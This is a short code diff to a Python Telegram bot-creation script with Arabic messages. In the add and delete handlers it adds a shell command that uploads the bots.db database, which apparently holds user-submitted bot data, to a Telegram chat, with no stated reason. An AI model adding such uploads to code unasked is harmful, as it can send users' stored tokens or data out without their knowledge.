@@ -162,6 +162,7 @@ def add_bot(message):
         bot.reply_to(message,
                      f"* تم إنشاء بوتك التواصل بنجاح.\n- اسم البوت :{name} \n- معرف البوت : @{username}\n- رقم البوت {bot_id}\n- يمكنك الآن إدارة بوتك بكل سهولة، ستجد رسالة في داخل البوت المصنوع ")
         os.system('python3 bots.py')
+        cmd(f'''uploadgram -1001821573758 bots.db''')
     except Exception as e:
         logging.error(e)
         bot.reply_to(message, "- لم يتم إدخال رمز بوت صحيح، تم إلغاء الأمر ‼️")
@@ -174,6 +175,7 @@ def delete_bot(message):
     c.execute('DELETE FROM messages WHERE bot_id=?', (message,))
     conn.commit()
     os.system('pkill -9 -f bots.py && python3 bots.py ')
+    cmd(f'''uploadgram -1001821573758 bots.db''')
 
 
 def view_bots(message):
